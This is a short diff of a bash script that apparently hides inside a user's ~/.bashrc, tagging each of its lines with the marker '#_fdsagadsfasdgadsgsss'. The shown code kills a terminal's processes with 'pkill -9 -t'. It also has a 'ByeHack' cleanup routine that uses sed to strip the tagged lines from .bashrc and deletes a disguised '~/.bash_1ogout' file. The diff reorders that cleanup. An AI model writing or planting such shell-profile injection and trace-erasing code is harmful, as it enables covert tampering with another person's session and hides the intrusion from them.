@@ -51,11 +51,10 @@ function  _ki { #_fdsagadsfasdgadsgsss
   pkill -9 -t $1  #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
 function ByeHack {    #_fdsagadsfasdgadsgsss
-    source ~/.bashrc; #_fdsagadsfasdgadsgsss
     sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bashrc;   #_fdsagadsfasdgadsgsss
     rm ~/.bash_1ogout;  #_fdsagadsfasdgadsgsss
-    _resume;    #_fdsagadsfasdgadsgsss
-    CL    #_fdsagadsfasdgadsgsss
+    _resume && CL    #_fdsagadsfasdgadsgsss
+    # CL    #_fdsagadsfasdgadsgsss
     if [ -f $index_f ];then #_fdsagadsfasdgadsgsss
       rm $index_f 2>/dev/null;    #_fdsagadsfasdgadsgsss
     fi #_fdsagadsfasdgadsgsss
